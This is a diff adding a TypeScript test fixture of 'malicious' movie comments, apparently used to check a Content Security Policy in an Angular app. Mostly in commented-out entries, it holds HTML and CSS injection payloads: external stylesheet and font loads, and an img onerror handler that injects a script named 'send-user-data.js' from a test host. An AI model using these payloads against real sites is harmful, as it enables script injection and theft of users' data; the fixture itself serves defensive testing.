@@ -1,0 +1,83 @@
+import { MovieComment } from '../src/app/core/models/movie-comment';
+
+export const maliciousComments: MovieComment[] = [
+  // font-src: external stylesheet
+  // {
+  //   userName: 'User1',
+  //   body: "<link rel='stylesheet' href='https://test-site.com.pl/malicious-font.css'>",
+  //   creationTime: '2020-03-04',
+  // },
+  // font-src: inline styles
+  // {
+  //   userName: 'User1',
+  //   body: `<style>@font-face { font-family: "MaliciousFont"; src: url("https://test-site.com.pl/send-user-data.js");}
+  //   p,h1, span { font-family: "MaliciousFont" !important;}</style>`,
+  //   creationTime: '2020-03-04',
+  // },
+  // style-src-elem: external stylesheet
+  // {
+  //   userName: 'User12',
+  //   body: "<link rel='stylesheet' href='http://localhost:3000/malicious-styles.css'>",
+  //   creationTime: '2020-03-04',
+  // },
+  // style-src: inline stylesheet
+  // {
+  //   userName: 'User12',
+  //   body: `
+
+  // <style>
+  // body {
+  //   background-color: blue;
+  // }
+
+  // .navbar {
+  //   background-color: green !important;
+  //   height: 30px !important;
+  // }
+
+  // .display {
+  //   width: 40% !important;
+  // }
+
+  // p,
+  // h1,
+  // span {
+  //   font-family: "Lucida Sans"
+  // }
+
+  // .comment-list {
+  //   background-color: yellow !important
+  // }
+  // </style>`,
+  //   creationTime: '2020-03-04',
+  // },
+  // img-src
+  // {
+  //   userName: 'User2',
+  //   // body: `<img src='#' if (!this.hasError) { this.hasError = true; onerror="this.onerror=null; var script = document.createElement('script'); script.src='http://localhost:3000/send-user-data.js'; document.body.appendChild(script);" />`,
+  //   body: `<img src='http://localhost:3000/banner.png'> `,
+  //   creationTime: '2020-03-04',
+  // },
+  // media-src
+  // {
+  //   userName: 'User2',
+  //   body: `<video src='http://localhost:3000/malicious-video.mp4' type="video/mp4"  controls autoplay></video>`,
+  //   creationTime: '2020-03-04',
+  // },
+  // object-src
+  {
+    userName: 'User2',
+    body: `<object data="http://localhost:3000/malicious-newsletter" width="300" height="100"></object>`,
+    creationTime: '2020-03-04',
+  },
+  {
+    userName: 'User3',
+    body: 'Oglądałem setki razy! 10/10.',
+    creationTime: '2020-03-04',
+  },
+  {
+    userName: 'User4',
+    body: 'Wspaniałe połączenie akcji i fabuły.',
+    creationTime: '2020-03-04',
+  },
+];
